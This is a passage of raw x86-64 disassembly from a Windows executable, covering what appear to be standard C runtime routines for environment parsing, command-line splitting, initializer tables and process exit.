   14000417e:	48 85 c0             	test   %rax,%rax
   140004181:	75 05                	jne    0x140004188
   140004183:	83 cf ff             	or     $0xffffffff,%edi
   140004186:	eb 27                	jmp    0x1400041af
   140004188:	48 8b cb             	mov    %rbx,%rcx
   14000418b:	e8 34 00 00 00       	call   0x1400041c4
   140004190:	48 85 c0             	test   %rax,%rax
   140004193:	75 05                	jne    0x14000419a
   140004195:	83 cf ff             	or     $0xffffffff,%edi
   140004198:	eb 0e                	jmp    0x1400041a8
   14000419a:	48 89 05 7f 41 01 00 	mov    %rax,0x1417f(%rip)        # 0x140018320
   1400041a1:	48 89 05 60 41 01 00 	mov    %rax,0x14160(%rip)        # 0x140018308
   1400041a8:	33 c9                	xor    %ecx,%ecx
   1400041aa:	e8 c1 1f 00 00       	call   0x140006170
   1400041af:	48 8b cb             	mov    %rbx,%rcx
   1400041b2:	e8 b9 1f 00 00       	call   0x140006170
   1400041b7:	8b c7                	mov    %edi,%eax
   1400041b9:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400041be:	48 83 c4 20          	add    $0x20,%rsp
   1400041c2:	5f                   	pop    %rdi
   1400041c3:	c3                   	ret
   1400041c4:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400041c9:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   1400041ce:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   1400041d3:	57                   	push   %rdi
   1400041d4:	41 56                	push   %r14
   1400041d6:	41 57                	push   %r15
   1400041d8:	48 83 ec 30          	sub    $0x30,%rsp
   1400041dc:	4c 8b f1             	mov    %rcx,%r14
   1400041df:	33 f6                	xor    %esi,%esi
   1400041e1:	8b ce                	mov    %esi,%ecx
   1400041e3:	4d 8b c6             	mov    %r14,%r8
   1400041e6:	41 8a 16             	mov    (%r14),%dl
   1400041e9:	eb 24                	jmp    0x14000420f
   1400041eb:	80 fa 3d             	cmp    $0x3d,%dl
   1400041ee:	48 8d 41 01          	lea    0x1(%rcx),%rax
   1400041f2:	48 0f 44 c1          	cmove  %rcx,%rax
   1400041f6:	48 8b c8             	mov    %rax,%rcx
   1400041f9:	48 83 c8 ff          	or     $0xffffffffffffffff,%rax
   1400041fd:	48 ff c0             	inc    %rax
   140004200:	41 38 34 00          	cmp    %sil,(%r8,%rax,1)
   140004204:	75 f7                	jne    0x1400041fd
   140004206:	49 ff c0             	inc    %r8
   140004209:	4c 03 c0             	add    %rax,%r8
   14000420c:	41 8a 10             	mov    (%r8),%dl
   14000420f:	84 d2                	test   %dl,%dl
   140004211:	75 d8                	jne    0x1400041eb
   140004213:	48 ff c1             	inc    %rcx
   140004216:	ba 08 00 00 00       	mov    $0x8,%edx
   14000421b:	e8 d8 1e 00 00       	call   0x1400060f8
   140004220:	48 8b d8             	mov    %rax,%rbx
   140004223:	48 85 c0             	test   %rax,%rax
   140004226:	74 6c                	je     0x140004294
   140004228:	4c 8b f8             	mov    %rax,%r15
   14000422b:	41 8a 06             	mov    (%r14),%al
   14000422e:	84 c0                	test   %al,%al
   140004230:	74 5f                	je     0x140004291
   140004232:	48 83 cd ff          	or     $0xffffffffffffffff,%rbp
   140004236:	48 ff c5             	inc    %rbp
   140004239:	41 38 34 2e          	cmp    %sil,(%r14,%rbp,1)
   14000423d:	75 f7                	jne    0x140004236
   14000423f:	48 ff c5             	inc    %rbp
   140004242:	3c 3d                	cmp    $0x3d,%al
   140004244:	74 35                	je     0x14000427b
   140004246:	ba 01 00 00 00       	mov    $0x1,%edx
   14000424b:	48 8b cd             	mov    %rbp,%rcx
   14000424e:	e8 a5 1e 00 00       	call   0x1400060f8
   140004253:	48 8b f8             	mov    %rax,%rdi
   140004256:	48 85 c0             	test   %rax,%rax
   140004259:	74 25                	je     0x140004280
   14000425b:	4d 8b c6             	mov    %r14,%r8
   14000425e:	48 8b d5             	mov    %rbp,%rdx
   140004261:	48 8b c8             	mov    %rax,%rcx
   140004264:	e8 57 0c 00 00       	call   0x140004ec0
   140004269:	33 c9                	xor    %ecx,%ecx
   14000426b:	85 c0                	test   %eax,%eax
   14000426d:	75 48                	jne    0x1400042b7
   14000426f:	49 89 3f             	mov    %rdi,(%r15)
   140004272:	49 83 c7 08          	add    $0x8,%r15
   140004276:	e8 f5 1e 00 00       	call   0x140006170
   14000427b:	4c 03 f5             	add    %rbp,%r14
   14000427e:	eb ab                	jmp    0x14000422b
   140004280:	48 8b cb             	mov    %rbx,%rcx
   140004283:	e8 44 00 00 00       	call   0x1400042cc
   140004288:	33 c9                	xor    %ecx,%ecx
   14000428a:	e8 e1 1e 00 00       	call   0x140006170
   14000428f:	eb 03                	jmp    0x140004294
   140004291:	48 8b f3             	mov    %rbx,%rsi
   140004294:	33 c9                	xor    %ecx,%ecx
   140004296:	e8 d5 1e 00 00       	call   0x140006170
   14000429b:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   1400042a0:	48 8b c6             	mov    %rsi,%rax
   1400042a3:	48 8b 74 24 60       	mov    0x60(%rsp),%rsi
   1400042a8:	48 8b 6c 24 58       	mov    0x58(%rsp),%rbp
   1400042ad:	48 83 c4 30          	add    $0x30,%rsp
   1400042b1:	41 5f                	pop    %r15
   1400042b3:	41 5e                	pop    %r14
   1400042b5:	5f                   	pop    %rdi
   1400042b6:	c3                   	ret
   1400042b7:	45 33 c9             	xor    %r9d,%r9d
   1400042ba:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   1400042bf:	45 33 c0             	xor    %r8d,%r8d
   1400042c2:	33 d2                	xor    %edx,%edx
   1400042c4:	e8 c7 15 00 00       	call   0x140005890
   1400042c9:	cc                   	int3
   1400042ca:	cc                   	int3
   1400042cb:	cc                   	int3
   1400042cc:	48 85 c9             	test   %rcx,%rcx
   1400042cf:	74 3b                	je     0x14000430c
   1400042d1:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400042d6:	57                   	push   %rdi
   1400042d7:	48 83 ec 20          	sub    $0x20,%rsp
   1400042db:	48 8b 01             	mov    (%rcx),%rax
   1400042de:	48 8b d9             	mov    %rcx,%rbx
   1400042e1:	48 8b f9             	mov    %rcx,%rdi
   1400042e4:	eb 0f                	jmp    0x1400042f5
   1400042e6:	48 8b c8             	mov    %rax,%rcx
   1400042e9:	e8 82 1e 00 00       	call   0x140006170
   1400042ee:	48 8d 7f 08          	lea    0x8(%rdi),%rdi
   1400042f2:	48 8b 07             	mov    (%rdi),%rax
   1400042f5:	48 85 c0             	test   %rax,%rax
   1400042f8:	75 ec                	jne    0x1400042e6
   1400042fa:	48 8b cb             	mov    %rbx,%rcx
   1400042fd:	e8 6e 1e 00 00       	call   0x140006170
   140004302:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140004307:	48 83 c4 20          	add    $0x20,%rsp
   14000430b:	5f                   	pop    %rdi
   14000430c:	c3                   	ret
   14000430d:	cc                   	int3
   14000430e:	cc                   	int3
   14000430f:	cc                   	int3
   140004310:	48 83 ec 28          	sub    $0x28,%rsp
   140004314:	48 8b 09             	mov    (%rcx),%rcx
   140004317:	48 3b 0d 02 40 01 00 	cmp    0x14002(%rip),%rcx        # 0x140018320
   14000431e:	74 05                	je     0x140004325
   140004320:	e8 a7 ff ff ff       	call   0x1400042cc
   140004325:	48 83 c4 28          	add    $0x28,%rsp
   140004329:	c3                   	ret
   14000432a:	cc                   	int3
   14000432b:	cc                   	int3
   14000432c:	48 83 ec 28          	sub    $0x28,%rsp
   140004330:	48 8b 09             	mov    (%rcx),%rcx
   140004333:	48 3b 0d de 3f 01 00 	cmp    0x13fde(%rip),%rcx        # 0x140018318
   14000433a:	74 05                	je     0x140004341
   14000433c:	e8 8b ff ff ff       	call   0x1400042cc
   140004341:	48 83 c4 28          	add    $0x28,%rsp
   140004345:	c3                   	ret
   140004346:	cc                   	int3
   140004347:	cc                   	int3
   140004348:	48 83 ec 28          	sub    $0x28,%rsp
   14000434c:	48 8d 0d b5 3f 01 00 	lea    0x13fb5(%rip),%rcx        # 0x140018308
   140004353:	e8 b8 ff ff ff       	call   0x140004310
   140004358:	48 8d 0d b1 3f 01 00 	lea    0x13fb1(%rip),%rcx        # 0x140018310
   14000435f:	e8 c8 ff ff ff       	call   0x14000432c
   140004364:	48 8b 0d b5 3f 01 00 	mov    0x13fb5(%rip),%rcx        # 0x140018320
   14000436b:	e8 5c ff ff ff       	call   0x1400042cc
   140004370:	48 8b 0d a1 3f 01 00 	mov    0x13fa1(%rip),%rcx        # 0x140018318
   140004377:	48 83 c4 28          	add    $0x28,%rsp
   14000437b:	e9 4c ff ff ff       	jmp    0x1400042cc
   140004380:	e9 d3 fd ff ff       	jmp    0x140004158
   140004385:	cc                   	int3
   140004386:	cc                   	int3
   140004387:	cc                   	int3
   140004388:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000438d:	57                   	push   %rdi
   14000438e:	48 83 ec 20          	sub    $0x20,%rsp
   140004392:	e8 39 31 00 00       	call   0x1400074d0
   140004397:	48 8b 05 1a 44 01 00 	mov    0x1441a(%rip),%rax        # 0x1400187b8
   14000439e:	48 8d 1d 83 3f 01 00 	lea    0x13f83(%rip),%rbx        # 0x140018328
   1400043a5:	48 85 c0             	test   %rax,%rax
   1400043a8:	48 0f 45 d8          	cmovne %rax,%rbx
   1400043ac:	40 32 ff             	xor    %dil,%dil
   1400043af:	0f b6 03             	movzbl (%rbx),%eax
   1400043b2:	3c 20                	cmp    $0x20,%al
   1400043b4:	77 09                	ja     0x1400043bf
   1400043b6:	84 c0                	test   %al,%al
   1400043b8:	74 30                	je     0x1400043ea
   1400043ba:	40 84 ff             	test   %dil,%dil
   1400043bd:	74 1e                	je     0x1400043dd
   1400043bf:	3c 22                	cmp    $0x22,%al
   1400043c1:	75 07                	jne    0x1400043ca
   1400043c3:	40 84 ff             	test   %dil,%dil
   1400043c6:	40 0f 94 c7          	sete   %dil
   1400043ca:	8b c8                	mov    %eax,%ecx
   1400043cc:	e8 af 34 00 00       	call   0x140007880
   1400043d1:	85 c0                	test   %eax,%eax
   1400043d3:	74 03                	je     0x1400043d8
   1400043d5:	48 ff c3             	inc    %rbx
   1400043d8:	48 ff c3             	inc    %rbx
   1400043db:	eb d2                	jmp    0x1400043af
   1400043dd:	3c 20                	cmp    $0x20,%al
   1400043df:	77 09                	ja     0x1400043ea
   1400043e1:	48 ff c3             	inc    %rbx
   1400043e4:	8a 03                	mov    (%rbx),%al
   1400043e6:	84 c0                	test   %al,%al
   1400043e8:	75 f3                	jne    0x1400043dd
   1400043ea:	48 8b c3             	mov    %rbx,%rax
   1400043ed:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400043f2:	48 83 c4 20          	add    $0x20,%rsp
   1400043f6:	5f                   	pop    %rdi
   1400043f7:	c3                   	ret
   1400043f8:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400043fd:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   140004402:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   140004407:	57                   	push   %rdi
   140004408:	48 83 ec 20          	sub    $0x20,%rsp
   14000440c:	33 ed                	xor    %ebp,%ebp
   14000440e:	48 8b fa             	mov    %rdx,%rdi
   140004411:	48 2b f9             	sub    %rcx,%rdi
   140004414:	48 8b d9             	mov    %rcx,%rbx
   140004417:	48 83 c7 07          	add    $0x7,%rdi
   14000441b:	8b f5                	mov    %ebp,%esi
   14000441d:	48 c1 ef 03          	shr    $0x3,%rdi
   140004421:	48 3b ca             	cmp    %rdx,%rcx
   140004424:	48 0f 47 fd          	cmova  %rbp,%rdi
   140004428:	48 85 ff             	test   %rdi,%rdi
   14000442b:	74 1a                	je     0x140004447
   14000442d:	48 8b 03             	mov    (%rbx),%rax
   140004430:	48 85 c0             	test   %rax,%rax
   140004433:	74 06                	je     0x14000443b
   140004435:	ff 15 4d 8e 00 00    	call   *0x8e4d(%rip)        # 0x14000d288
   14000443b:	48 83 c3 08          	add    $0x8,%rbx
   14000443f:	48 ff c6             	inc    %rsi
   140004442:	48 3b f7             	cmp    %rdi,%rsi
   140004445:	75 e6                	jne    0x14000442d
   140004447:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000444c:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   140004451:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   140004456:	48 83 c4 20          	add    $0x20,%rsp
   14000445a:	5f                   	pop    %rdi
   14000445b:	c3                   	ret
   14000445c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140004461:	57                   	push   %rdi
   140004462:	48 83 ec 20          	sub    $0x20,%rsp
   140004466:	48 8b fa             	mov    %rdx,%rdi
   140004469:	48 8b d9             	mov    %rcx,%rbx
   14000446c:	48 3b ca             	cmp    %rdx,%rcx
   14000446f:	74 1b                	je     0x14000448c
   140004471:	48 8b 03             	mov    (%rbx),%rax
   140004474:	48 85 c0             	test   %rax,%rax
   140004477:	74 0a                	je     0x140004483
   140004479:	ff 15 09 8e 00 00    	call   *0x8e09(%rip)        # 0x14000d288
   14000447f:	85 c0                	test   %eax,%eax
   140004481:	75 0b                	jne    0x14000448e
   140004483:	48 83 c3 08          	add    $0x8,%rbx
   140004487:	48 3b df             	cmp    %rdi,%rbx
   14000448a:	eb e3                	jmp    0x14000446f
   14000448c:	33 c0                	xor    %eax,%eax
   14000448e:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140004493:	48 83 c4 20          	add    $0x20,%rsp
   140004497:	5f                   	pop    %rdi
   140004498:	c3                   	ret
   140004499:	cc                   	int3
   14000449a:	cc                   	int3
   14000449b:	cc                   	int3
   14000449c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400044a1:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   1400044a6:	57                   	push   %rdi
   1400044a7:	48 83 ec 20          	sub    $0x20,%rsp
   1400044ab:	49 8b d9             	mov    %r9,%rbx
   1400044ae:	49 8b f8             	mov    %r8,%rdi
   1400044b1:	8b 0a                	mov    (%rdx),%ecx
   1400044b3:	e8 70 1b 00 00       	call   0x140006028
   1400044b8:	90                   	nop
   1400044b9:	48 8b cf             	mov    %rdi,%rcx
   1400044bc:	e8 13 00 00 00       	call   0x1400044d4
   1400044c1:	90                   	nop
   1400044c2:	8b 0b                	mov    (%rbx),%ecx
   1400044c4:	e8 b3 1b 00 00       	call   0x14000607c
   1400044c9:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400044ce:	48 83 c4 20          	add    $0x20,%rsp
   1400044d2:	5f                   	pop    %rdi
   1400044d3:	c3                   	ret
   1400044d4:	40 53                	rex push %rbx
   1400044d6:	48 83 ec 20          	sub    $0x20,%rsp
   1400044da:	48 8b d9             	mov    %rcx,%rbx
   1400044dd:	80 3d 54 3e 01 00 00 	cmpb   $0x0,0x13e54(%rip)        # 0x140018338
   1400044e4:	0f 85 9f 00 00 00    	jne    0x140004589
   1400044ea:	b8 01 00 00 00       	mov    $0x1,%eax
   1400044ef:	87 05 37 3e 01 00    	xchg   %eax,0x13e37(%rip)        # 0x14001832c
   1400044f5:	48 8b 01             	mov    (%rcx),%rax
   1400044f8:	8b 08                	mov    (%rax),%ecx
   1400044fa:	85 c9                	test   %ecx,%ecx
   1400044fc:	75 34                	jne    0x140004532
   1400044fe:	48 8b 05 fb 2a 01 00 	mov    0x12afb(%rip),%rax        # 0x140017000
   140004505:	8b c8                	mov    %eax,%ecx
   140004507:	83 e1 3f             	and    $0x3f,%ecx
   14000450a:	48 8b 15 1f 3e 01 00 	mov    0x13e1f(%rip),%rdx        # 0x140018330
   140004511:	48 3b d0             	cmp    %rax,%rdx
   140004514:	74 13                	je     0x140004529
   140004516:	48 33 c2             	xor    %rdx,%rax
   140004519:	48 d3 c8             	ror    %cl,%rax
   14000451c:	45 33 c0             	xor    %r8d,%r8d
   14000451f:	33 d2                	xor    %edx,%edx
   140004521:	33 c9                	xor    %ecx,%ecx
   140004523:	ff 15 5f 8d 00 00    	call   *0x8d5f(%rip)        # 0x14000d288
   140004529:	48 8d 0d 18 3e 01 00 	lea    0x13e18(%rip),%rcx        # 0x140018348
   140004530:	eb 0c                	jmp    0x14000453e
   140004532:	83 f9 01             	cmp    $0x1,%ecx
   140004535:	75 0d                	jne    0x140004544
   140004537:	48 8d 0d 22 3e 01 00 	lea    0x13e22(%rip),%rcx        # 0x140018360
   14000453e:	e8 39 07 00 00       	call   0x140004c7c
   140004543:	90                   	nop
   140004544:	48 8b 03             	mov    (%rbx),%rax
   140004547:	83 38 00             	cmpl   $0x0,(%rax)
   14000454a:	75 13                	jne    0x14000455f
   14000454c:	48 8d 15 d5 8d 00 00 	lea    0x8dd5(%rip),%rdx        # 0x14000d328
   140004553:	48 8d 0d ae 8d 00 00 	lea    0x8dae(%rip),%rcx        # 0x14000d308
   14000455a:	e8 99 fe ff ff       	call   0x1400043f8
   14000455f:	48 8d 15 d2 8d 00 00 	lea    0x8dd2(%rip),%rdx        # 0x14000d338
   140004566:	48 8d 0d c3 8d 00 00 	lea    0x8dc3(%rip),%rcx        # 0x14000d330
   14000456d:	e8 86 fe ff ff       	call   0x1400043f8
   140004572:	48 8b 43 08          	mov    0x8(%rbx),%rax
   140004576:	83 38 00             	cmpl   $0x0,(%rax)
   140004579:	75 0e                	jne    0x140004589
   14000457b:	c6 05 b6 3d 01 00 01 	movb   $0x1,0x13db6(%rip)        # 0x140018338
   140004582:	48 8b 43 10          	mov    0x10(%rbx),%rax
   140004586:	c6 00 01             	movb   $0x1,(%rax)
   140004589:	48 83 c4 20          	add    $0x20,%rsp
   14000458d:	5b                   	pop    %rbx
   14000458e:	c3                   	ret
   14000458f:	e8 0c 09 00 00       	call   0x140004ea0
   140004594:	90                   	nop
   140004595:	cc                   	int3
   140004596:	cc                   	int3
   140004597:	cc                   	int3
   140004598:	33 c0                	xor    %eax,%eax
   14000459a:	81 f9 63 73 6d e0    	cmp    $0xe06d7363,%ecx
   1400045a0:	0f 94 c0             	sete   %al
   1400045a3:	c3                   	ret
   1400045a4:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400045a9:	44 89 44 24 18       	mov    %r8d,0x18(%rsp)
   1400045ae:	89 54 24 10          	mov    %edx,0x10(%rsp)
   1400045b2:	55                   	push   %rbp
   1400045b3:	48 8b ec             	mov    %rsp,%rbp
   1400045b6:	48 83 ec 50          	sub    $0x50,%rsp
   1400045ba:	8b d9                	mov    %ecx,%ebx
   1400045bc:	45 85 c0             	test   %r8d,%r8d
   1400045bf:	75 4a                	jne    0x14000460b
   1400045c1:	33 c9                	xor    %ecx,%ecx
   1400045c3:	ff 15 77 8a 00 00    	call   *0x8a77(%rip)        # 0x14000d040
   1400045c9:	48 85 c0             	test   %rax,%rax
   1400045cc:	74 3d                	je     0x14000460b
   1400045ce:	b9 4d 5a 00 00       	mov    $0x5a4d,%ecx
   1400045d3:	66 39 08             	cmp    %cx,(%rax)
   1400045d6:	75 33                	jne    0x14000460b
   1400045d8:	48 63 48 3c          	movslq 0x3c(%rax),%rcx
   1400045dc:	48 03 c8             	add    %rax,%rcx
   1400045df:	81 39 50 45 00 00    	cmpl   $0x4550,(%rcx)
   1400045e5:	75 24                	jne    0x14000460b
   1400045e7:	b8 0b 02 00 00       	mov    $0x20b,%eax
   1400045ec:	66 39 41 18          	cmp    %ax,0x18(%rcx)
   1400045f0:	75 19                	jne    0x14000460b
   1400045f2:	83 b9 84 00 00 00 0e 	cmpl   $0xe,0x84(%rcx)
   1400045f9:	76 10                	jbe    0x14000460b
   1400045fb:	83 b9 f8 00 00 00 00 	cmpl   $0x0,0xf8(%rcx)
   140004602:	74 07                	je     0x14000460b
   140004604:	8b cb                	mov    %ebx,%ecx
   140004606:	e8 a1 00 00 00       	call   0x1400046ac
   14000460b:	48 8d 45 18          	lea    0x18(%rbp),%rax
   14000460f:	c6 45 28 00          	movb   $0x0,0x28(%rbp)
   140004613:	48 89 45 e0          	mov    %rax,-0x20(%rbp)
   140004617:	4c 8d 4d d4          	lea    -0x2c(%rbp),%r9
   14000461b:	48 8d 45 20          	lea    0x20(%rbp),%rax
   14000461f:	48 89 45 e8          	mov    %rax,-0x18(%rbp)
   140004623:	4c 8d 45 e0          	lea    -0x20(%rbp),%r8
   140004627:	48 8d 45 28          	lea    0x28(%rbp),%rax
   14000462b:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
   14000462f:	48 8d 55 d8          	lea    -0x28(%rbp),%rdx
   140004633:	b8 02 00 00 00       	mov    $0x2,%eax
   140004638:	48 8d 4d d0          	lea    -0x30(%rbp),%rcx
   14000463c:	89 45 d4             	mov    %eax,-0x2c(%rbp)
   14000463f:	89 45 d8             	mov    %eax,-0x28(%rbp)
   140004642:	e8 55 fe ff ff       	call   0x14000449c
   140004647:	83 7d 20 00          	cmpl   $0x0,0x20(%rbp)
   14000464b:	74 0b                	je     0x140004658
   14000464d:	48 8b 5c 24 60       	mov    0x60(%rsp),%rbx
   140004652:	48 83 c4 50          	add    $0x50,%rsp
   140004656:	5d                   	pop    %rbp
   140004657:	c3                   	ret
   140004658:	8b cb                	mov    %ebx,%ecx
   14000465a:	e8 01 00 00 00       	call   0x140004660
   14000465f:	cc                   	int3
   140004660:	40 53                	rex push %rbx
   140004662:	48 83 ec 20          	sub    $0x20,%rsp
   140004666:	8b d9                	mov    %ecx,%ebx
   140004668:	e8 5f 34 00 00       	call   0x140007acc
   14000466d:	83 f8 01             	cmp    $0x1,%eax
   140004670:	74 28                	je     0x14000469a
   140004672:	65 48 8b 04 25 60 00 	mov    %gs:0x60,%rax
   140004679:	00 00 
   14000467b:	8b 90 bc 00 00 00    	mov    0xbc(%rax),%edx
   140004681:	c1 ea 08             	shr    $0x8,%edx
   140004684:	f6 c2 01             	test   $0x1,%dl
   140004687:	75 11                	jne    0x14000469a
   140004689:	ff 15 f1 89 00 00    	call   *0x89f1(%rip)        # 0x14000d080
   14000468f:	48 8b c8             	mov    %rax,%rcx
   140004692:	8b d3                	mov    %ebx,%edx
   140004694:	ff 15 d6 89 00 00    	call   *0x89d6(%rip)        # 0x14000d070
   14000469a:	8b cb                	mov    %ebx,%ecx
   14000469c:	e8 0b 00 00 00       	call   0x1400046ac
   1400046a1:	8b cb                	mov    %ebx,%ecx
   1400046a3:	ff 15 ff 8a 00 00    	call   *0x8aff(%rip)        # 0x14000d1a8
   1400046a9:	cc                   	int3
   1400046aa:	cc                   	int3
   1400046ab:	cc                   	int3
   1400046ac:	40 53                	rex push %rbx
   1400046ae:	48 83 ec 20          	sub    $0x20,%rsp
   1400046b2:	48 83 64 24 38 00    	andq   $0x0,0x38(%rsp)
   1400046b8:	4c 8d 44 24 38       	lea    0x38(%rsp),%r8
   1400046bd:	8b d9                	mov    %ecx,%ebx
   1400046bf:	48 8d 15 52 9d 00 00 	lea    0x9d52(%rip),%rdx        # 0x14000e418
   1400046c6:	33 c9                	xor    %ecx,%ecx
   1400046c8:	ff 15 e2 8a 00 00    	call   *0x8ae2(%rip)        # 0x14000d1b0
   1400046ce:	85 c0                	test   %eax,%eax
   1400046d0:	74 1f                	je     0x1400046f1
   1400046d2:	48 8b 4c 24 38       	mov    0x38(%rsp),%rcx
   1400046d7:	48 8d 15 52 9d 00 00 	lea    0x9d52(%rip),%rdx        # 0x14000e430
   1400046de:	ff 15 54 89 00 00    	call   *0x8954(%rip)        # 0x14000d038
   1400046e4:	48 85 c0             	test   %rax,%rax
   1400046e7:	74 08                	je     0x1400046f1
   1400046e9:	8b cb                	mov    %ebx,%ecx
   1400046eb:	ff 15 97 8b 00 00    	call   *0x8b97(%rip)        # 0x14000d288
   1400046f1:	48 8b 4c 24 38       	mov    0x38(%rsp),%rcx
   1400046f6:	48 85 c9             	test   %rcx,%rcx
   1400046f9:	74 06                	je     0x140004701
   1400046fb:	ff 15 47 89 00 00    	call   *0x8947(%rip)        # 0x14000d048
   140004701:	48 83 c4 20          	add    $0x20,%rsp
   140004705:	5b                   	pop    %rbx
   140004706:	c3                   	ret
   140004707:	cc                   	int3
   140004708:	48 89 0d 21 3c 01 00 	mov    %rcx,0x13c21(%rip)        # 0x140018330
   14000470f:	c3                   	ret
   140004710:	ba 02 00 00 00       	mov    $0x2,%edx
   140004715:	33 c9                	xor    %ecx,%ecx
   140004717:	44 8d 42 ff          	lea    -0x1(%rdx),%r8d
   14000471b:	e9 84 fe ff ff       	jmp    0x1400045a4
   140004720:	33 d2                	xor    %edx,%edx
   140004722:	33 c9                	xor    %ecx,%ecx
   140004724:	44 8d 42 01          	lea    0x1(%rdx),%r8d
   140004728:	e9 77 fe ff ff       	jmp    0x1400045a4
   14000472d:	cc                   	int3
   14000472e:	cc                   	int3
   14000472f:	cc                   	int3
   140004730:	45 33 c0             	xor    %r8d,%r8d
   140004733:	41 8d 50 02          	lea    0x2(%r8),%edx
   140004737:	e9 68 fe ff ff       	jmp    0x1400045a4
   14000473c:	48 83 ec 28          	sub    $0x28,%rsp
   140004740:	4c 8b 05 b9 28 01 00 	mov    0x128b9(%rip),%r8        # 0x140017000
   140004747:	48 8b d1             	mov    %rcx,%rdx
   14000474a:	41 8b c0             	mov    %r8d,%eax
   14000474d:	b9 40 00 00 00       	mov    $0x40,%ecx
   140004752:	83 e0 3f             	and    $0x3f,%eax
   140004755:	2b c8                	sub    %eax,%ecx
   140004757:	4c 39 05 d2 3b 01 00 	cmp    %r8,0x13bd2(%rip)        # 0x140018330
   14000475e:	75 12                	jne    0x140004772
   140004760:	48 d3 ca             	ror    %cl,%rdx
   140004763:	49 33 d0             	xor    %r8,%rdx
   140004766:	48 89 15 c3 3b 01 00 	mov    %rdx,0x13bc3(%rip)        # 0x140018330
   14000476d:	48 83 c4 28          	add    $0x28,%rsp
   140004771:	c3                   	ret
   140004772:	e8 29 07 00 00       	call   0x140004ea0
   140004777:	cc                   	int3
   140004778:	45 33 c0             	xor    %r8d,%r8d
   14000477b:	33 d2                	xor    %edx,%edx
   14000477d:	e9 22 fe ff ff       	jmp    0x1400045a4
   140004782:	cc                   	int3
   140004783:	cc                   	int3
   140004784:	48 83 ec 28          	sub    $0x28,%rsp
   140004788:	8d 81 00 c0 ff ff    	lea    -0x4000(%rcx),%eax
   14000478e:	a9 ff 3f ff ff       	test   $0xffff3fff,%eax
   140004793:	75 12                	jne    0x1400047a7
   140004795:	81 f9 00 c0 00 00    	cmp    $0xc000,%ecx
   14000479b:	74 0a                	je     0x1400047a7
   14000479d:	87 0d 25 40 01 00    	xchg   %ecx,0x14025(%rip)        # 0x1400187c8
   1400047a3:	33 c0                	xor    %eax,%eax
   1400047a5:	eb 15                	jmp    0x1400047bc
   1400047a7:	e8 e4 11 00 00       	call   0x140005990
   1400047ac:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   1400047b2:	e8 b9 10 00 00       	call   0x140005870
   1400047b7:	b8 16 00 00 00       	mov    $0x16,%eax
   1400047bc:	48 83 c4 28          	add    $0x28,%rsp
   1400047c0:	c3                   	ret
   1400047c1:	cc                   	int3
   1400047c2:	cc                   	int3
   1400047c3:	cc                   	int3
   1400047c4:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400047c9:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   1400047ce:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   1400047d3:	57                   	push   %rdi
   1400047d4:	48 83 ec 30          	sub    $0x30,%rsp
   1400047d8:	49 8b f9             	mov    %r9,%rdi
   1400047db:	8b 0a                	mov    (%rdx),%ecx
   1400047dd:	e8 46 18 00 00       	call   0x140006028
   1400047e2:	90                   	nop
   1400047e3:	48 8d 1d 46 3d 01 00 	lea    0x13d46(%rip),%rbx        # 0x140018530
   1400047ea:	48 8d 35 6f 28 01 00 	lea    0x1286f(%rip),%rsi        # 0x140017060
   1400047f1:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   1400047f6:	48 8d 05 3b 3d 01 00 	lea    0x13d3b(%rip),%rax        # 0x140018538
   1400047fd:	48 3b d8             	cmp    %rax,%rbx
   140004800:	74 19                	je     0x14000481b
   140004802:	48 39 33             	cmp    %rsi,(%rbx)
   140004805:	74 0e                	je     0x140004815
   140004807:	48 8b d6             	mov    %rsi,%rdx
   14000480a:	48 8b cb             	mov    %rbx,%rcx
   14000480d:	e8 ba 40 00 00       	call   0x1400088cc
   140004812:	48 89 03             	mov    %rax,(%rbx)
   140004815:	48 83 c3 08          	add    $0x8,%rbx
   140004819:	eb d6                	jmp    0x1400047f1
   14000481b:	8b 0f                	mov    (%rdi),%ecx
   14000481d:	e8 5a 18 00 00       	call   0x14000607c
   140004822:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   140004827:	48 8b 74 24 48       	mov    0x48(%rsp),%rsi
   14000482c:	48 83 c4 30          	add    $0x30,%rsp
   140004830:	5f                   	pop    %rdi
   140004831:	c3                   	ret
   140004832:	cc                   	int3
   140004833:	cc                   	int3
   140004834:	b8 01 00 00 00       	mov    $0x1,%eax
   140004839:	87 05 fd 3a 01 00    	xchg   %eax,0x13afd(%rip)        # 0x14001833c
   14000483f:	c3                   	ret
   140004840:	4c 8b dc             	mov    %rsp,%r11
   140004843:	48 83 ec 28          	sub    $0x28,%rsp
   140004847:	b8 04 00 00 00       	mov    $0x4,%eax
   14000484c:	4d 8d 4b 10          	lea    0x10(%r11),%r9
   140004850:	4d 8d 43 08          	lea    0x8(%r11),%r8
   140004854:	89 44 24 38          	mov    %eax,0x38(%rsp)
   140004858:	49 8d 53 18          	lea    0x18(%r11),%rdx
   14000485c:	89 44 24 40          	mov    %eax,0x40(%rsp)
   140004860:	49 8d 4b 08          	lea    0x8(%r11),%rcx
